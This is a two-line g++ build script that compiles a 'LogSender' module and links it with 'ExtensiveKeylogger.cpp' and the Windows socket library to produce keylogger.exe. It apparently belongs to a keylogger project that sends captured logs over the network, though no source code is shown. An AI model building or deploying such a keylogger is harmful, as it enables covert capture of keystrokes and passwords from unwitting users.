g++ -c LogSender.hpp LogSender.cpp
g++ ExtensiveKeylogger.cpp LogSender.o -lwsock32 -o keylogger.exe